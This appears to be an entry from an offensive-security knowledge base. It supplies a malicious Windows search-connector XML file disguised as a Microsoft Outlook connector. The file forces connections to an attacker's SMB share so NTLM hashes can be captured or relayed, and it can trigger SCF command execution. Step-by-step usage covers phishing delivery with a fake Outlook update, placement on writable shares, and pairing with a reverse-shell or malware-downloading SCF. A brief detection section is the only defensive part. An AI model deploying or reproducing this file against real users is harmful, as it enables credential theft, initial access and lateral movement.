---
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:03.477179+00:00'
updated_at: '2023-04-10T20:26:08.887135+00:00'
tags:
  - scf-attack
  - search-connector
  - windows-execution
platforms:
  - Windows
validated: true
---

# Malicious-Windows-Search-Connector-XML-for-SCF-Attack

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```

## Description

This XML snippet creates a malicious .searchconnector-ms file disguised as a legitimate Microsoft Outlook search connector. When saved with the .searchconnector-ms extension and interacted with by a user (e.g., double-clicked or added to Windows Search), it forces Windows to connect to the specified SMB share (\\workstation@8888\\folder). The iconReference points to a file (folder.ico) on the share, which can be a malicious SCF file that executes commands upon loading. This enables drive-by execution or NTLM relay for credential theft in Windows environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| workstation | Attacker's hostname or IP for the SMB share | attacker-host |
| 8888 | Custom port for SMB connection (often used for NTLM relay tools like Responder) | 445 (standard) or 8888 (relay) |
| folder | Name of the SMB share containing the malicious SCF/URL | public-share |
| folder.ico | Name of the icon file on the share (disguise SCF as .ico to trigger execution) | malicious.scf (renamed) |

To customize, manually edit the strings in the XML before saving (e.g., replace 'workstation@8888' with 'attacker-ip@8888').

## Usage

1. Edit the XML with your attacker details and save as 'Legit-App.searchconnector-ms'.
2. Place on a writable share accessible to the target.
3. Deliver via phishing (e.g., 'Add this Outlook search update') to prompt user click.
4. Ensure the share has a corresponding SCF file with [Shell] command= for payload execution, such as running a reverse shell or downloading malware.
This code is used in the [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share-via-Windows-Search-Connectors-Files]] procedure for initial access or lateral movement.

## Detection

- File creation monitoring for .searchconnector-ms files with suspicious UNC paths in XML (use Sysmon Event ID 11 with file hashes).
- Network logs showing SMB over non-445 ports (e.g., 8888) or unusual internal connections (IDS rules for Responder-like traffic).
- Process creation from explorer.exe spawning unexpected commands (e.g., powershell.exe from SCF load).
- EDR alerts on SCF file parsing or anomalous icon loading from network shares.
